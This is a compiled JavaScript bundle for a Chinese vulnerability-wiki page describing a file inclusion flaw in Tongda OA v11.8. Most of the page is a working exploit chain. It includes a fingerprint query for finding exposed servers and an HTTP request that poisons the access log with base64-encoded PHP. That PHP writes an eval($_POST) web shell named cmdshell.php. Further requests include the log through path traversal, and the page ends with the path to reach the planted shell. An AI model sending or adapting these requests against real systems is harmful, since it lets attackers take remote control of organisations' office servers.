{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{1039:function(t,s,a){t.exports=a.p+\"assets/img/1628303888717-4ffc91a6-e87e-4e00-8bd5-b2218bb0772a-20220313173009245.70c7bdb3.png\"},1040:function(t,s,a){t.exports=a.p+\"assets/img/1628304243872-a7ae1965-2e21-4551-9d92-b42a3468617b.c3539d12.png\"},1041:function(t,s,a){t.exports=a.p+\"assets/img/1628304347438-754f2570-1b25-4e9e-b822-ec78c2ca944a.6ba8bc69.png\"},1042:function(t,s,a){t.exports=a.p+\"assets/img/1628304579748-4614da68-4756-43a6-b7c1-dc6e9e034819.5e3ba95c.png\"},1043:function(t,s,a){t.exports=a.p+\"assets/img/1628304836865-aee81900-a2a1-402c-9915-77a3d908e480.a4fb9c9a.png\"},1910:function(t,s,a){\"use strict\";a.r(s);var n=a(56),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":t.$parent.slotKey}},[n(\"h1\",{attrs:{id:\"通达oa-v11-8-getway-php-远程文件包含漏洞\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#通达oa-v11-8-getway-php-远程文件包含漏洞\"}},[t._v(\"#\")]),t._v(\" 通达OA v11.8 getway.php 远程文件包含漏洞\")]),t._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞描述\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞描述\"}},[t._v(\"#\")]),t._v(\" 漏洞描述\")]),t._v(\" \"),n(\"p\",[t._v(\"通达OA v11.8 getway.php 存在文件包含漏洞，攻击者通过发送恶意请求包含日志文件导致任意文件写入漏洞\")]),t._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞影响\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞影响\"}},[t._v(\"#\")]),t._v(\" 漏洞影响\")]),t._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v(\"通达OA v11.8\")]),n(\"br\"),t._v(\" \"),n(\"h2\",{attrs:{id:\"网络测绘\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#网络测绘\"}},[t._v(\"#\")]),t._v(\" 网络测绘\")]),t._v(\" \"),n(\"a-checkbox\",{attrs:{checked:\"\"}},[t._v('app=\"TDXK-通达OA\" ')]),n(\"br\"),t._v(\" \"),n(\"h2\",{attrs:{id:\"漏洞复现\"}},[n(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#漏洞复现\"}},[t._v(\"#\")]),t._v(\" 漏洞复现\")]),t._v(\" \"),n(\"p\",[t._v(\"登陆页面\")]),t._v(\" \"),n(\"p\",[n(\"img\",{attrs:{src:a(1039),alt:\"img\"}})]),t._v(\" \"),n(\"p\",[t._v(\"发送恶意请求让日志被记录\")]),t._v(\" \"),n(\"div\",{staticClass:\"language-php extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[n(\"code\",[t._v(\"GET /d1a4278d?json={}&aa=\"),n(\"span\",{pre:!0,attrs:{class:\"token php language-php\"}},[n(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[t._v(\"<?php\")]),t._v(\" @\"),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"fputs\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"fopen\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"base64_decode\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token string single-quoted-string\"}},[t._v(\"'Y21kc2hlbGwucGhw'\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),t._v(\"w\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\",\")]),n(\"span\",{pre:!0,attrs:{class:\"token function\"}},[t._v(\"base64_decode\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"(\")]),n(\"span\",{pre:!0,attrs:{class:\"token string single-quoted-string\"}},[t._v(\"'PD9waHAgQGV2YWwoJF9QT1NUWydjbWRzaGVsbCddKTs/Pg=='\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\")\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\";\")]),n(\"span\",{pre:!0,attrs:{class:\"token delimiter important\"}},[t._v(\"?>\")])]),t._v(\" HTTP/1.1\\nHost: \\nUser-Agent: Go-http-client/1.1\\nAccept-Encoding: gzip\\n\")])])]),n(\"p\",[n(\"img\",{attrs:{src:a(1040),alt:\"img\"}})]),t._v(\" \"),n(\"p\",[t._v(\"在通过漏洞包含日志文件\")]),t._v(\" \"),n(\"div\",{staticClass:\"language-php extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[n(\"code\",[n(\"span\",{pre:!0,attrs:{class:\"token constant\"}},[t._v(\"POST\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"ispirit\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),n(\"span\",{pre:!0,attrs:{class:\"token keyword\"}},[t._v(\"interface\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"gateway\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\".\")]),t._v(\"php \"),n(\"span\",{pre:!0,attrs:{class:\"token constant\"}},[t._v(\"HTTP\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1.1\")]),t._v(\"\\nHost\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" \\nUser\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Agent\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" Go\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"http\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"client\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1.1\")]),t._v(\"\\nContent\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Length\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"54\")]),t._v(\"\\nContent\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Type\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" application\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"x\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"www\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"form\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"urlencoded\\nAccept\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Encoding\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" gzip\\n\\njson\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),n(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"url\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"/general/../../nginx/logs/oa.access.log\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\")])])]),n(\"p\",[n(\"img\",{attrs:{src:a(1041),alt:\"img\"}})]),t._v(\" \"),n(\"p\",[t._v(\"再次发送恶意请求写入文件\")]),t._v(\" \"),n(\"div\",{staticClass:\"language-php extra-class\"},[n(\"pre\",{pre:!0,attrs:{class:\"language-php\"}},[n(\"code\",[n(\"span\",{pre:!0,attrs:{class:\"token constant\"}},[t._v(\"POST\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"mac\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"gateway\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\".\")]),t._v(\"php \"),n(\"span\",{pre:!0,attrs:{class:\"token constant\"}},[t._v(\"HTTP\")]),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1.1\")]),t._v(\"\\nHost\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" \\nUser\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Agent\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" Go\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"http\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"client\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"1.1\")]),t._v(\"\\nContent\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Length\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" \"),n(\"span\",{pre:!0,attrs:{class:\"token number\"}},[t._v(\"54\")]),t._v(\"\\nContent\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Type\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" application\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"/\")]),t._v(\"x\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"www\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"form\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"urlencoded\\nAccept\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"-\")]),t._v(\"Encoding\"),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),t._v(\" gzip\\n\\njson\"),n(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[t._v(\"=\")]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"{\")]),n(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"url\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\":\")]),n(\"span\",{pre:!0,attrs:{class:\"token string double-quoted-string\"}},[t._v('\"/general/../../nginx/logs/oa.access.log\"')]),n(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[t._v(\"}\")]),t._v(\"\\n\")])])]),n(\"p\",[n(\"img\",{attrs:{src:a(1042),alt:\"img\"}})]),t._v(\" \"),n(\"p\",[t._v(\"访问写入的文件 \"),n(\"strong\",[t._v(\"/mac/cmdshell.php\")]),n(\"img\",{attrs:{src:a(1043),alt:\"img\"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);","extractedComments":[]}